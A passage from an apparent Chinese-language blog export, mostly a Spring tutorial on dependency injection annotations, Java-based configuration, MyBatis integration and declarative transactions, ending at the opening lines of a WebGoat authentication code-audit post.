\"dog2\")\nprivate Dog dog;\n\n测试，成功输出！\n测试实验步骤：\n1、配置文件修改内容，保证类型存在对象。且名字不为类的默认名字！\n\n&lt;bean id=\"dog2\" class=\"com.example.pojo.Dog\"/>&lt;bean id=\"cat2\" class=\"com.example.pojo.Cat\"/>\n\n2、没有加Qualifier测试，直接报错\n3、在属性上添加Qualifier注解\n\n@Autowired\n@Qualifier(value = \"cat2\")\nprivate Cat cat;\n@Autowired\n@Qualifier(value = \"dog2\")\nprivate Dog dog;\n\n测试，成功输出！\n@Resource非常灵活的一种自动注入，可以理解为 byName + byType\n\n@Resource 如有指定的 name 属性，先按该属性进行 byName 方式查找装配；\n其次再进行默认的 byName 方式进行装配；\n如果以上都不成功，则按 byType 的方式自动装配。\n都不成功，则报异常。\n\n测试实验步骤：\n1、配置文件修改内容，保证类型存在对象。且名字不为类的默认名字！\n&lt;bean id=\"dog1\" class=\"com.example.pojo.Dog\"/>&lt;bean id=\"dog2\" class=\"com.example.pojo.Dog\"/>&lt;bean id=\"cat1\" class=\"com.example.pojo.Cat\"/>&lt;bean id=\"cat2\" class=\"com.example.pojo.Cat\"/>\n\n修改 People.java，使用 @Resource 注解\npublic class People &#123;\n\t@Resource(name=\"cat2\")\n\tprivate Cat cat;\n\t@Resource(name=\"dog2\")\n\tprivate Dog dog;\n\tprivate String name;\n&#125;\n\n测试，成功输出！\n小结@Autowired 与 @Resource 异同：\n\n@Autowired 与 @Resource 都可以用来装配 bean。都可以写在字段上，或写在 set 方法上。\n@Autowired 通过 byType 的方式实现，而且必须要求这个对象存在！【常用】\n@Resource 默认通过 byname 的方式实现，如果找不到名字，则通过 byType 实现！如果两个都找不到的情况下，就报错！【常用】\n它们的作用相同都是用注解方式注入对象，但执行顺序不同。@Autowired 先 byType，@Resource先 byName。\n\n0x07 使用注解开发\n也算是把我们在 Spring 中接触到的这些注解，做一个简单的总结。\n\n关于注解的一些说明在 Spring4 之后，想要使用注解形式，必须得要引入 aop 的包，这个在 Spring-webmvc 的大包里面基本也是自带的。\n我们之前都是使用 bean 的标签进行 bean 注入，但是实际开发中，我们一般都会使用注解！\n配置扫描哪些包下的注解\n&lt;!--指定注解扫描包-->\n&lt;context:component-scan base-package=\"com.example.pojo\"/>\n\n在指定包下编写类，增加注解\n@Component(\"user\")\n// 相当于配置文件中 &lt;bean id=\"user\" class=\"当前注解的类\"/>\npublic class User &#123;\n   public String name = \"Drunkbaby\";\n&#125;\n\nAnnotationTest.java 测试类\nimport com.drunkbaby.pojo.User;  \nimport org.junit.Test;  \nimport org.springframework.context.ApplicationContext;  \nimport org.springframework.context.support.ClassPathXmlApplicationContext;  \n  \n  \n  \npublic class AnnotationTest &#123;  \n    @Test  \n public void TestApplication() &#123;  \n        ApplicationContext context = new ClassPathXmlApplicationContext(\"applicationContext.xml\");  \n        User user = context.getBean(\"user\",User.class);  \n        System.out.println(user.name);  \n    &#125;  \n&#125;\n\n成功\n\n\n属性注入\n属性注入的说法比较学名，简单理解一下就是赋值\n\n可以不用提供 setter 方法，直接在直接名上添加 @Value(“值”)\n@Component\npublic class User &#123;\n    // 相当于&lt;property name=\"name\" value=\"John\"/>\n    @Value(\"Drunkbaby\")\n    public String name;\n&#125;\n\n如果提供了set方法，在set方法上添加@Value(“值”);\n@Component\npublic class User &#123;\n    public String name;\n \n    // 也可以放在set方法上面\n    @Value(\"Drunkbaby\")\n    public void setName(String name) &#123;\n        this.name = name;\n    &#125;\n&#125;\n\n一般没有人会写在 Setter 方法地方吧，这不是扰乱自己视线吗？\n这个 @Value 的注解在 Spring-mvc 的项目会经常用到，而里面的这个值可以写在 application.properties 中，到时候就可以直接调用。\n衍生的注解我们这些注解，就是替代了在配置文件当中配置步骤而已！更加的方便快捷！\n@Component 三个衍生注解：\n为了更好的进行分层，Spring 可以使用其它三个注解，功能一样，目前使用哪一个功能都一样。\n\n@Controller：web 层\n@Service：service 层\n@Repository：dao 层\n\n写上这些注解，就相当于将这个类交给 Spring 管理装配了！学习 SpringBoot 的时候这种思想就更为明显。\n自动装配注解这个其实在之前已经讲过了，快速过一遍\n@Autowired：默认是 byType 方式，如果匹配不上，就会 byName\n@Nullable：字段标记了这个注解，说明该字段可以为空\n@Resource：默认是 byName 方式，如果匹配不上，就会 byType\n作用域@scope\n\nsingleton：默认的，Spring 会采用单例模式创建这个对象。关闭工厂 ，所有的对象都会销毁。\nprototype：多例模式。关闭工厂 ，所有的对象不会销毁。内部的垃圾回收机制会回收\n\n小结xml 与注解：\n\nxml 更加万能，维护简单，适用于任何场合\n注解不是自己的类使用不了，维护复杂，开发简单方便\n\n最佳实践：\n\nxml 用来管理 Bean\n注解只用来完成属性的注入\n可以不用扫描，扫描是为了类上的注解，但是要开启注解支持  &lt;context:annotation-config/&gt;\n\n0x08 用 Java 的方式配置 Spring这个到了 SpringBoot 里面可以说是主流的选择了，也就是我们平常写项目时的 config 文件夹，因为 Spring 本身写 XML 太累了，繁琐至极，所以用 Java 的方式写 config，可以使得我们代码的可读性更高。\n\n完全不使用 XML\n\nUser.java\npackage pojo;  \n  \nimport org.springframework.beans.factory.annotation.Value;  \nimport org.springframework.stereotype.Component;  \n  \n// 这里这个注解的意思,就是说明这个类被Spring接管了,注册到了容器中  \n@Component  \npublic class User &#123;  \n    private String name;  \n  \n    public String getName() &#123;  \n        return name;  \n    &#125;  \n  \n    // 属性注入值  \n @Value(\"Drunkbaby\")  \n    public void setName(String name) &#123;  \n        this.name = name;  \n    &#125;  \n  \n    @Override  \n public String toString() &#123;  \n        return \"User&#123;\" +  \n                \"name='\" + name + '\\'' +  \n                '&#125;';  \n    &#125;  \n&#125;\n\nMyConfig.java\npackage config;  \n  \nimport org.springframework.context.annotation.Bean;  \nimport org.springframework.context.annotation.ComponentScan;  \nimport org.springframework.context.annotation.Configuration;  \nimport org.springframework.context.annotation.Import;  \nimport org.springframework.stereotype.Component;  \nimport pojo.User;  \n  \n@Configuration  \n@ComponentScan(\"pojo\")  \npublic class MyConfig &#123;  \n  \n    @Bean  \n public User getUser()&#123;  \n        return new User();  \n    &#125;  \n&#125;\n\n\n测试类\n\n  \nimport config.MyConfig;  \nimport org.junit.Test;  \nimport org.springframework.context.ApplicationContext;  \nimport org.springframework.context.annotation.AnnotationConfigApplicationContext;  \nimport org.springframework.context.support.ClassPathXmlApplicationContext;  \nimport pojo.User;  \n  \n  \npublic class ConfigTestApplication &#123;  \n    @Test  \n public void TestApplication() &#123;  \n        ApplicationContext applicationContext = new AnnotationConfigApplicationContext(MyConfig.class);  \n        User user = (User) applicationContext.getBean(\"getUser\");  \n        System.out.println(user.getName());  \n    &#125;  \n&#125;\n\n成功！\n\n\n0x09 代理模式与 AOP这里就不再赘述了，在这篇文章中有详细的学习Java反序列化基础篇-04-JDK动态代理)\n0x10 结合 mybatis 的实际开发基础开发，也是炒冷饭环节导包：\n&lt;dependencies>  \n    &lt;dependency>  \n        &lt;groupId>junit&lt;/groupId>  \n        &lt;artifactId>junit&lt;/artifactId>  \n        &lt;version>4.12&lt;/version>  \n    &lt;/dependency>  \n    &lt;dependency>  \n        &lt;groupId>org.mybatis&lt;/groupId>  \n        &lt;artifactId>mybatis&lt;/artifactId>  \n        &lt;version>3.5.2&lt;/version>  \n    &lt;/dependency>  \n    &lt;dependency>  \n        &lt;groupId>mysql&lt;/groupId>  \n        &lt;artifactId>mysql-connector-java&lt;/artifactId>  \n        &lt;version>5.1.47&lt;/version>  \n    &lt;/dependency>  \n    &lt;dependency>  \n        &lt;groupId>org.springframework&lt;/groupId>  \n        &lt;artifactId>spring-webmvc&lt;/artifactId>  \n        &lt;version>5.1.10.RELEASE&lt;/version>  \n    &lt;/dependency>  \n    &lt;dependency>  \n        &lt;groupId>org.springframework&lt;/groupId>  \n        &lt;artifactId>spring-jdbc&lt;/artifactId>  \n        &lt;version>5.1.10.RELEASE&lt;/version>  \n    &lt;/dependency>  \n \t&lt;dependency>  \n        &lt;groupId>org.aspectj&lt;/groupId>  \n        &lt;artifactId>aspectjweaver&lt;/artifactId>  \n        &lt;version>1.9.4&lt;/version>  \n    &lt;/dependency>  \n    &lt;dependency>  \n        &lt;groupId>org.mybatis&lt;/groupId>  \n        &lt;artifactId>mybatis-spring&lt;/artifactId>  \n        &lt;version>2.0.2&lt;/version>  \n    &lt;/dependency>  \n&lt;/dependencies>\n\n实体类 User.java \npackage com.drunkbaby.pojo;  \n  \npublic class User &#123;  \n  \n    private int id;  \n    private String name;  \n    private String pwd;  \n  \n    @Override  \n public String toString() &#123;  \n        return \"User&#123;\" +  \n                \"id=\" + id +  \n                \", name='\" + name + '\\'' +  \n                \", pwd='\" + pwd + '\\'' +  \n                '&#125;';  \n    &#125;  \n&#125;\n\n编写核心配置文件 mybatis-config.xml\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n&lt;!DOCTYPE configuration\n       PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"\n       \"http://mybatis.org/dtd/mybatis-3-config.dtd\">\n&lt;configuration>\n \n   &lt;typeAliases>\n       &lt;package name=\"com.drunkbaby.pojo\"/>\n   &lt;/typeAliases>\n \n   &lt;environments default=\"development\">\n       &lt;environment id=\"development\">\n           &lt;transactionManager type=\"JDBC\"/>\n           &lt;dataSource type=\"POOLED\">\n               &lt;property name=\"driver\" value=\"com.mysql.jdbc.Driver\"/>\n               &lt;property name=\"url\" value=\"jdbc:mysql://localhost:3306/test?useSSL=true&amp;amp;useUnicode=true&amp;amp;characterEncoding=utf8\"/>\n               &lt;property name=\"username\" value=\"root\"/>\n               &lt;property name=\"password\" value=\"\"/>\n           &lt;/dataSource>\n       &lt;/environment>\n   &lt;/environments>\n \n   &lt;mappers>\n       &lt;package name=\"com.drunkbaby.mapper\"/>\n   &lt;/mappers>\n&lt;/configuration>\n\n编写接口 UserMapper\npackage com.drunkbaby.mapper;  \n  \nimport com.drunkbaby.pojo.User;  \n  \nimport java.util.List;  \n  \npublic interface UserMapper &#123;  \n    public List&lt;User> selectUser();  \n&#125;\n\n编写对应的 xml 文件 UserMapper.xml\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?>  \n&lt;!DOCTYPE mapper  \n PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"  \n \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\">  \n&lt;mapper namespace=\"com.drunkbaby.mapper.UserMapper\">  \n  \n    &lt;select id=\"selectUser\" resultType=\"User\">  \n select * from test.user &lt;/select>  \n  \n&lt;/mapper>\n\n测试 MybatisTest\nimport com.drunkbaby.mapper.UserMapper;  \nimport com.drunkbaby.pojo.User;  \nimport org.apache.ibatis.io.Resources;  \nimport org.apache.ibatis.session.SqlSession;  \nimport org.apache.ibatis.session.SqlSessionFactory;  \nimport org.apache.ibatis.session.SqlSessionFactoryBuilder;  \nimport org.junit.Test;  \n  \nimport java.io.IOException;  \nimport java.io.InputStream;  \nimport java.util.List;  \n  \npublic class MybatisTest &#123;  \n    @Test  \n public void selectUser() throws IOException &#123;  \n  \n        String resource = \"mybatis-config.xml\";  \n        InputStream inputStream = Resources.getResourceAsStream(resource);  \n        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);  \n        SqlSession sqlSession = sqlSessionFactory.openSession();  \n  \n        UserMapper mapper = sqlSession.getMapper(UserMapper.class);  \n  \n        List&lt;User> userList = mapper.selectUser();  \n        for (User user: userList)&#123;  \n            System.out.println(user);  \n        &#125;  \n  \n        sqlSession.close();  \n    &#125;  \n  \n&#125;\n\n\n\nMybatis-Spring\n上文是一个正常的 Mybatis 程序的应用，接下来，我们要把它与 Spring 做一个整合，充分发挥出 Spring 的特点。\n\n在整合之前，不免的，要唠点基础知识。\n基础知识在开始使用 MyBatis-Spring 之前，你需要先熟悉 Spring 和 MyBatis 这两个框架和有关它们的术语。这很重要\nMyBatis-Spring 需要以下版本：\nMyBatis-SpringMyBatisSpring 框架Spring BatchJava2.03.5+5.0+4.0+Java 8+1.33.4+3.2.2+2.1+Java 6+\n\n如果使用 Maven 作为构建工具，仅需要在 pom.xml 中加入以下代码即可：\n&lt;dependency>\n   &lt;groupId>org.mybatis&lt;/groupId>\n   &lt;artifactId>mybatis-spring&lt;/artifactId>\n   &lt;version>2.0.2&lt;/version>\n&lt;/dependency>\n\n要和 Spring 一起使用 MyBatis，需要在 Spring 应用上下文中定义至少两样东西：一个 SqlSessionFactory 和至少一个数据映射器类。\n\n官方文档中是如下记述的：\n\n关于 SqlSessionFactory在 MyBatis-Spring 中，可使用SqlSessionFactoryBean来创建 SqlSessionFactory。要配置这个工厂 bean，只需要把下面代码放在 Spring 的 XML 配置文件中：\n&lt;bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\">\n &lt;property name=\"dataSource\" ref=\"dataSource\" />\n&lt;/bean>\n\n注意：SqlSessionFactory需要一个 DataSource（数据源）。这可以是任意的 DataSource，只需要和配置其它 Spring 数据库连接一样配置它就可以了。\n在基础的 MyBatis 用法中，是通过 SqlSessionFactoryBuilder 来创建 SqlSessionFactory 的。而在 MyBatis-Spring 中，则使用 SqlSessionFactoryBean 来创建。\n在 MyBatis 中，你可以使用 SqlSessionFactory 来创建 SqlSession。一旦你获得一个 session 之后，你可以使用它来执行映射了的语句，提交或回滚连接，最后，当不再需要它的时候，你可以关闭 session。\nSqlSessionFactory有一个唯一的必要属性：用于 JDBC 的 DataSource。这可以是任意的 DataSource 对象，它的配置方法和其它 Spring 数据库连接是一样的。\n一个常用的属性是 configLocation，它用来指定 MyBatis 的 XML 配置文件路径。它在需要修改 MyBatis 的基础配置非常有用。通常，基础配置指的是 &lt;settings&gt; 或 &lt;typeAliases&gt;元素。\n关于 SqlSessionTemplateSqlSessionTemplate 是 MyBatis-Spring 的核心。作为 SqlSession 的一个实现，这意味着可以使用它无缝代替你代码中已经在使用的 SqlSession。\n模板可以参与到 Spring 的事务管理中，并且由于其是线程安全的，可以供多个映射器类使用，你应该总是用 SqlSessionTemplate 来替换 MyBatis 默认的 DefaultSqlSession 实现。在同一应用程序中的不同类之间混杂使用可能会引起数据一致性的问题。\n可以使用 SqlSessionFactory 作为构造方法的参数来创建 SqlSessionTemplate 对象。\n&lt;bean id=\"sqlSession\" class=\"org.mybatis.spring.SqlSessionTemplate\">\n &lt;constructor-arg index=\"0\" ref=\"sqlSessionFactory\" />\n&lt;/bean>\n\n现在，这个 bean 就可以直接注入到你的 DAO bean 中了。你需要在你的 bean 中添加一个 SqlSession 属性，就像下面这样：\npublic class UserDaoImpl implements UserDao &#123;\n \n private SqlSession sqlSession;\n \n public void setSqlSession(SqlSession sqlSession) &#123;\n   this.sqlSession = sqlSession;\n&#125;\n \n public User getUser(String userId) &#123;\n   return sqlSession.getMapper...;\n&#125;\n&#125;\n\n按下面这样，注入 SqlSessionTemplate：\n&lt;bean id=\"userDao\" class=\"org.mybatis.spring.sample.dao.UserDaoImpl\">\n &lt;property name=\"sqlSession\" ref=\"sqlSession\" />\n&lt;/bean>\n\n上述都是官方文档的做法，接下来根据我们自己的业务需求，进行整合。\n整合实现一1、首先，创建一个 applicationContext.xml\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n      xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n      xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n       http://www.springframework.org/schema/beans/spring-beans.xsd\">\n&lt;/beans>\n\n2、配置数据源替换 mybaits 的数据源\n&lt;!--配置数据源：数据源有非常多，可以使用第三方的，也可使使用Spring的-->\n&lt;bean id=\"dataSource\" class=\"org.springframework.jdbc.datasource.DriverManagerDataSource\">\n   &lt;property name=\"driverClassName\" value=\"com.mysql.jdbc.Driver\"/>\n   &lt;property name=\"url\" value=\"jdbc:mysql://localhost:3306/mybatis?useSSL=true&amp;amp;useUnicode=true&amp;amp;characterEncoding=utf8\"/>\n   &lt;property name=\"username\" value=\"root\"/>\n   &lt;property name=\"password\" value=\"\"/>\n&lt;/bean>\n\n3、配置 SqlSessionFactory，关联 MyBatis\n&lt;!--配置SqlSessionFactory-->\n&lt;bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\">\n   &lt;property name=\"dataSource\" ref=\"dataSource\"/>\n   &lt;!--关联Mybatis-->\n   &lt;property name=\"configLocation\" value=\"classpath:mybatis-config.xml\"/>\n   &lt;property name=\"mapperLocations\" value=\"classpath:com/example/dao/*.xml\"/>\n&lt;/bean>\n\n4、注册 sqlSessionTemplate，关联 sqlSessionFactory；\n&lt;!--注册sqlSessionTemplate , 关联sqlSessionFactory-->\n&lt;bean id=\"sqlSession\" class=\"org.mybatis.spring.SqlSessionTemplate\">\n   &lt;!--利用构造器注入-->\n   &lt;constructor-arg index=\"0\" ref=\"sqlSessionFactory\"/>\n&lt;/bean>\n\n5、增加 Dao 接口的实现类；私有化 sqlSessionTemplate\npublic class UserMapperImpl implements UserMapper &#123;\n \n   //sqlSession不用我们自己创建了，Spring来管理\n   private SqlSessionTemplate sqlSession;\n \n   public void setSqlSession(SqlSessionTemplate sqlSession) &#123;\n       this.sqlSession = sqlSession;\n  &#125;\n \n   public List&lt;User> selectUser() &#123;\n       UserMapper mapper = sqlSession.getMapper(UserMapper.class);\n       return mapper.selectUser();\n  &#125;\n \n&#125;\n\n6、注册 bean 实现\n&lt;bean id=\"userMapper\" class=\"com.example.dao.userMapperImpl\">\n   &lt;property name=\"sqlSession\" ref=\"sqlSession\"/>\n&lt;/bean>\n\n7、测试\n@Test\npublic void test()&#123;\n    ApplicationContext context = new ClassPathXmlApplicationContext(\"applicationContext.xml\");\n    UserMapper mapper = (UserMapper) context.getBean(\"userMapper\");\n    List&lt;User> user = mapper.selectUser();\n    System.out.println(user);\n&#125;\n\n整合成功！\n\n\n整合实现二dao 继承 Support 类 , 直接利用 getSqlSession() 获得 , 然后直接注入 SqlSessionFactory . 比起方式一 , 不需要管理 SqlSessionTemplate , 而且对事务的支持更加友好\nSqlSessionDaoSupport\nSqlSessionDaoSupport 是一个抽象的支持类，用来为你提供 SqlSession。调用 getSqlSession() 方法你会得到一个 SqlSessionTemplate，之后可以用于执行 SQL 方法，就像下面这样:\npublic class UserDaoImpl extends SqlSessionDaoSupport implements UserDao &#123;\n  public User getUser(String userId) &#123;\n    return getSqlSession().selectOne(\"org.mybatis.spring.sample.mapper.UserMapper.getUser\", userId);\n  &#125;\n&#125;\n\n在这个类里面，通常更倾向于使用 MapperFactoryBean，因为它不需要额外的代码。但是，如果你需要在 DAO 中做其它非 MyBatis 的工作或需要一个非抽象的实现类，那么这个类就很有用了。\nSqlSessionDaoSupport 需要通过属性设置一个 sqlSessionFactory 或 SqlSessionTemplate。如果两个属性都被设置了，那么 SqlSessionFactory 将被忽略。\n假设类 UserMapperImpl 是 SqlSessionDaoSupport 的子类，可以编写如下的 Spring 配置来执行设置：\n&lt;bean id=\"userDao\" class=\"org.mybatis.spring.sample.dao.UserDaoImpl\">\n  &lt;property name=\"sqlSessionFactory\" ref=\"sqlSessionFactory\" />\n&lt;/bean>\n\n测试：\n1、将我们上面写的 UserMapperImpl 修改一下\n&lt;bean id=\"userDao\" class=\"org.mybatis.spring.sample.dao.UserDaoImpl\">\n  &lt;property name=\"sqlSessionFactory\" ref=\"sqlSessionFactory\" />\n&lt;/bean>\n\n2、修改 bean 的配置，这时候要把第一种的 userMapper 配置注释一下\n&lt;bean id=\"userMapper\" class=\"com.example.mapper.UserMapperImpl\">\n    &lt;property name=\"sqlSessionFactory\" ref=\"sqlSessionFactory\" />\n&lt;/bean>\n\n3、测试\n@Test\npublic void test() throws IOException&#123;\n    ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"applicationContext.xml\");\n    UserMapper userMapper = context.getBean(\"userMapper\", UserMapper.class);\n    for (User user : userMapper.selectUser()) &#123;\n        System.out.println(user);\n    &#125;\n&#125;\n\n\n\n总结 : 整合到 Spring 以后可以完全不要 mybatis 的配置文件，除了这些方式可以实现整合之外，我们还可以使用注解来实现。\n0x11 声明式事务\nSpring 学习的终章篇\n\n回顾事务\n事务在项目开发过程非常重要，涉及到数据的一致性的问题，不容马虎！\n事务管理是企业级应用程序开发中必备技术，用来确保数据的完整性和一致性。\n\n事务就是把一系列的动作当成一个独立的工作单元，这些动作要么全部完成，要么全部不起作用。\n事务四个属性ACID\n\n原子性（atomicity）\n\n事务是原子性操作，由一系列动作组成，事务的原子性确保动作要么全部完成，要么完全不起作用\n\n一致性（consistency）\n\n一旦所有事务动作完成，事务就要被提交。数据和资源处于一种满足业务规则的一致性状态中\n\n隔离性（isolation）\n\n可能多个事务会同时处理相同的数据，因此每个事务都应该与其他事务隔离开来，防止数据损坏\n\n持久性（durability）\n\n事务一旦完成，无论系统发生什么错误，结果都不会受到影响。通常情况下，事务的结果被写到持久化存储器中\n测试在之前的案例中，我们给 userMapper 接口新增三个方法，删除和增加用户；\n//添加一个用户\nint addUser(User user);\n \n//根据id删除用户\nint deleteUser(int id);\n \npublic List&lt;User> test();\n\n编写接口的实现类，在实现类中，我们去操作一波\npublic class UserMapperImpl extends SqlSessionDaoSupport implements UserMapper &#123;\n \n   //增加一些操作\n   public List&lt;>User test() &#123;\n       UserMapper mapper = getSqlSession().getMapper(UserMapper.class);\n       User user = new User(5,\"小明\",\"123456\");\n       mapper.addUser(user);\n       mapper.deleteUser(5);\n       return mapper.selectUser();\n   &#125; \n \n   public List&lt;User> selectUser() &#123;\n       UserMapper mapper = getSqlSession().getMapper(UserMapper.class);\n       return mapper.selectUser();\n  &#125;\n \n   //新增\n   public int addUser(User user) &#123;\n       UserMapper mapper = getSqlSession().getMapper(UserMapper.class);\n       return mapper.addUser(user);\n  &#125;\n   //删除\n   public int deleteUser(int id) &#123;\n       UserMapper mapper = getSqlSession().getMapper(UserMapper.class);\n       return mapper.deleteUser(id);\n  &#125;\n \n&#125;\n\n到UserMapper.xml配置文件中添加映射，并且故意把 deletes 写错\n&lt;insert id=\"addUser\" resultType=\"User\">\n    insert into mybatis.user (id, name, pwd) values (#&#123;id&#125;,#&#123;name&#125;,#&#123;pwd&#125;)\n&lt;/insert>\n \n&lt;delete id=\"deleteUser\" resultType=\"User\">\n    deletes from mybatis.user where id=#&#123;id&#125;\n&lt;/delete>\n \n&lt;select id=\"test\" resultType=\"User\"/>\n\n测试\n@Test\npublic void test()&#123;\n    ApplicationContext context = new ClassPathXmlApplicationContext(\"applicationContext.xml\");\n    UserMapper mapper = (UserMapper) context.getBean(\"userMapper\");\n    List&lt;User> userlist = mapper.test();\n    for (User user : userlist) &#123;\n        System.out.println(user);\n    &#125;\n&#125;\n\n报错：sql异常，delete写错了\n结果 ：插入成功！\n没有进行事务的管理；我们想让他们都成功才成功，有一个失败，就都失败，我们就应该需要事务！\n以前我们都需要自己手动管理事务，十分麻烦！\n但是Spring给我们提供了事务管理，我们只需要配置即可；\nSpring中的事务管理Spring在不同的事务管理API之上定义了一个抽象层，使得开发人员不必了解底层的事务管理API就可以使用Spring的事务管理机制。Spring支持编程式事务管理和声明式的事务管理。\n编程式事务管理\n\n将事务管理代码嵌到业务方法中来控制事务的提交和回滚\n缺点：必须在每个事务操作业务逻辑中包含额外的事务管理代码\n\n声明式事务管理\n\n一般情况下比编程式事务好用。\n将事务管理代码从业务方法中分离出来，以声明的方式来实现事务管理。\n将事务管理作为横切关注点，通过aop方法模块化。Spring中通过Spring AOP框架支持声明式事务管理。\n\n使用Spring管理事务，注意头文件的约束导入 : tx\nxmlns:tx=\"http://www.springframework.org/schema/tx\"\n \nhttp://www.springframework.org/schema/tx\nhttp://www.springframework.org/schema/tx/spring-tx.xsd\">\n\n事务管理器\n\n无论使用Spring的哪种事务管理策略（编程式或者声明式）事务管理器都是必须的。\n就是 Spring的核心事务管理抽象，管理封装了一组独立于技术的方法。\n\nJDBC事务\n&lt;bean id=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\">\n       &lt;property name=\"dataSource\" ref=\"dataSource\" />\n&lt;/bean>\n\n配置好事务管理器后我们需要去配置事务的通知\n&lt;!--配置事务通知-->\n&lt;tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\">\n   &lt;tx:attributes>\n       &lt;!--配置哪些方法使用什么样的事务,配置事务的传播特性-->\n       &lt;tx:method name=\"add\" propagation=\"REQUIRED\"/>\n       &lt;tx:method name=\"delete\" propagation=\"REQUIRED\"/>\n       &lt;tx:method name=\"update\" propagation=\"REQUIRED\"/>\n       &lt;tx:method name=\"search*\" propagation=\"REQUIRED\"/>\n       &lt;tx:method name=\"get\" read-only=\"true\"/>\n       &lt;tx:method name=\"*\" propagation=\"REQUIRED\"/>\n   &lt;/tx:attributes>\n&lt;/tx:advice>\n\n配置AOP\n导入aop的头文件！\n&lt;!--配置aop织入事务-->\n&lt;aop:config>\n   &lt;aop:pointcut id=\"txPointCut\" expression=\"execution(* com.example.mapper.*.*(..))\"/>\n   &lt;aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"txPointCut\"/>\n&lt;/aop:config>\n\n最终我们的spring-dao.xml配置文件完整如下：\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:tx=\"http://www.springframework.org/schema/tx\"\n       xmlns:aop=\"http://www.springframework.org/schema/aop\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n       http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/tx\n       http://www.springframework.org/schema/tx/spring-tx.xsd\n       http://www.springframework.org/schema/aop\n       https://www.springframework.org/schema/aop/spring-aop.xsd\">\n \n    &lt;bean id=\"dataSource\" class=\"org.springframework.jdbc.datasource.DriverManagerDataSource\">\n        &lt;property name=\"driverClassName\" value=\"com.mysql.jdbc.Driver\"/>\n        &lt;property name=\"url\" value=\"jdbc:mysql://localhost:3306/mybatis?useSSL=true&amp;amp;useUnicode=true&amp;amp;characterEncoding=utf8\"/>\n        &lt;property name=\"username\" value=\"root\"/>\n        &lt;property name=\"password\" value=\"\"/>\n    &lt;/bean>\n \n    &lt;bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\">\n        &lt;property name=\"dataSource\" ref=\"dataSource\" />\n        &lt;!--绑定MyBatis配置文件-->\n        &lt;property name=\"configLocation\" value=\"classpath:mybatis-config.xml\"/>\n        &lt;property name=\"mapperLocations\" value=\"classpath:com/example/mapper/UserMapper.xml\"/>\n    &lt;/bean>\n \n    &lt;bean id=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\">\n        &lt;constructor-arg ref=\"dataSource\" />\n    &lt;/bean>\n \n    &lt;!--结合AOP实现事务的织入-->\n    &lt;!--配置事务的类：-->\n    &lt;!--配置事务通知：-->\n    &lt;tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\">\n        &lt;!--给哪些方法配置事务-->\n        &lt;!--配置事务的传播特性-->\n        &lt;tx:attributes>\n            &lt;tx:method name=\"add\" propagation=\"REQUIRED\"/>\n            &lt;tx:method name=\"delete\" propagation=\"REQUIRED\"/>\n            &lt;tx:method name=\"query\" read-only=\"true\"/>\n            &lt;tx:method name=\"*\" propagation=\"REQUIRED\"/>\n        &lt;/tx:attributes>\n    &lt;/tx:advice>\n \n    &lt;!--配置事务切入-->\n    &lt;aop:config>\n        &lt;aop:pointcut id=\"txPointCut\" expression=\"execution(* com.example.mapper.*.*(..))\"/>\n        &lt;aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"txPointCut\"/>\n    &lt;/aop:config>\n&lt;/beans>\n\n进行测试\n删掉刚才插入的数据，再次测试！\n@Test\npublic void test()&#123;\n    ApplicationContext context = new ClassPathXmlApplicationContext(\"applicationContext.xml\");\n    UserMapper mapper = (UserMapper) context.getBean(\"userMapper\");\n    List&lt;User> userlist = mapper.test();\n    for (User user : userlist) &#123;\n        System.out.println(user);\n    &#125;\n&#125;\n\n这时候仍然报错但是插入不成功了！\n\n思考问题？\n\n为什么需要配置事务？\n\n如果不配置事务，可能存在数据提交不一致的情况下；\n如果不在spring中去配置声明式事务，我们就需要在代码中手动配置事务\n事务在项目的开发中非常重要，涉及到数据的一致性和完整性问题！\n\n0x12 参考资料Spring基础https://www.bilibili.com/video/BV1WE411d7Dv\n","categories":["Java 开发"],"tags":["Java 开发"]},{"title":"WebGoat代码审计-04-身份认证缺陷(下)","url":"/2022/04/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-04-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7(%E4%B8%8B)/","content":"WebGoat代码审计-04-身份认证缺陷(下)\n\nWebGoat代码审计-04-身份认证缺陷(下)0x01 前言续上篇 WebGoat代码审计-04-身份认证缺陷(上))\n\n接下来讲一下其他的两种身份验证\n\n0x02 Password Reset 密码重置\n密码重置这里主要也是以业务逻辑漏洞居多。\n\n1. Password Reset PageLesson2 使用 WebWolf源码部分源码文件是 SimpleMailAssignment.Java\n\n先看登录界面\n\n\n这里的第 56 - 67 行，简单的身份认证，当 username 和 password 都正确，则登录。\n\n\n\n第 58 - 60 行，基础的 Java 语法讲解\npublic AttackResult login(@RequestParam String email, @RequestParam String password) &#123;  \n    String emailAddress = ofNullable(email).orElse(\"unknown@webgoat.org\");  // emailAddress 等于 email，如果没有 email 这个值，则为 \"unknown@webgoat.org\"\n String username = extractUsername(emailAddress); // 